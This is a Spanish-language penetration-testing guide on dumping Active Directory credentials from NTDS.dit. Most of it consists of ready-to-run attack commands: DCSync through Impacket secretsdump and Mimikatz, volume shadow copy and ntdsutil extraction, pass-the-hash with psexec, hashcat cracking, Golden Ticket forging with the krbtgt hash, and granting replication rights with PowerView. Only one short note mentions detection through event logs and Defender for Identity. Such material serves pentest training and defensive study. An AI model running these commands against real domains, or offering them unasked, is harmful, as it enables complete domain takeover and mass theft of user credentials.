# Active Directory y NTDS.dit

`NTDS.dit` es la base de datos del Domain Controller de Active Directory. Contiene todos los objetos del dominio: cuentas de usuario, grupos, políticas y, crucialmente, los **hashes NTLM y claves Kerberos de todos los usuarios del dominio**. Comprometer NTDS.dit equivale a comprometer el dominio entero.

### Ubicación y estructura

El archivo se encuentra en `C:\Windows\NTDS\NTDS.dit` en el Domain Controller. Al igual que SAM, también requiere la boot key del `SYSTEM` del DC para descifrar los hashes.

> 🚨 **Importante:** NTDS.dit está en uso continuo por el proceso `ntdsa.dll`. No puede copiarse directamente con xcopy o robocopy. Se necesitan VSS o las APIs del DC.

### DCSync — el método preferido

DCSync simula el comportamiento de un Domain Controller secundario solicitando replicación al DC principal. No requiere acceso físico al DC — solo credenciales con permisos de replicación (`DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`). Los grupos con estos permisos por defecto son Domain Admins, Enterprise Admins y el propio KRBTGT.

```bash
# Con Impacket secretsdump (desde Linux)
impacket-secretsdump DOMINIO/AdminUser:Password@dc01.dominio.local

# Dump de un usuario específico
impacket-secretsdump DOMINIO/AdminUser:Password@dc01.dominio.local -just-dc-user krbtgt
impacket-secretsdump DOMINIO/AdminUser:Password@dc01.dominio.local -just-dc-user Administrator

# Con hash NTLM (Pass-the-Hash)
impacket-secretsdump -hashes :nthash DOMINIO/AdminUser@dc01.dominio.local
```

Con Mimikatz desde un host unido al dominio con privilegios DA:

```
lsadump::dcsync /domain:dominio.local /user:krbtgt
lsadump::dcsync /domain:dominio.local /all /csv
```

### Extracción física de NTDS.dit — VSS en el DC

Si se tiene shell en el DC pero no se pueden usar APIs de replicación (poco común):

```cmd
# Crear shadow copy del volumen C:
vssadmin create shadow /for=C:

# Copiar NTDS.dit y SYSTEM desde la shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\

# Procesar offline con secretsdump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

También con `ntdsutil`:

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q
# Genera una copia consistente del NTDS.dit y SYSTEM en C:\Temp\ntds_dump\
```

### Salida de secretsdump — formato

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
DOMINIO\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DOMINIO\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e4d3c3d7b3f5a9c2e1d8f6a7b9c0d1e2:::
DOMINIO\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

### Post-explotación con los hashes

```bash
# Pass-the-Hash con admin del dominio
impacket-psexec -hashes :nthash DOMINIO/Administrator@target

# Cracking de hashes NT
hashcat -m 1000 domain_hashes.txt rockyou.txt -r best64.rule

# Golden Ticket con el hash de krbtgt
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain dominio.local Administrator
```

### Permisos necesarios para DCSync

Si no se es DA/EA, se puede conceder el permiso manualmente a una cuenta controlada (requiere privilegios de DA para hacerlo):

```powershell
# Con PowerView
Add-ObjectACL -PrincipalIdentity usuario_controlado -Rights DCSync
```

> DCSync genera eventos en el DC (Event ID 4662 — operación realizada en un objeto AD). EDRs modernos y soluciones como Microsoft Defender for Identity detectan DCSync por el patrón de replicación anómala desde una cuenta que no es DC.

> El hash del account `krbtgt` es el objetivo más valioso de todo el dominio. Con él se puede crear un Golden Ticket que permite autenticarse como cualquier usuario del dominio durante 10 años (o hasta que se resetee `krbtgt` dos veces).
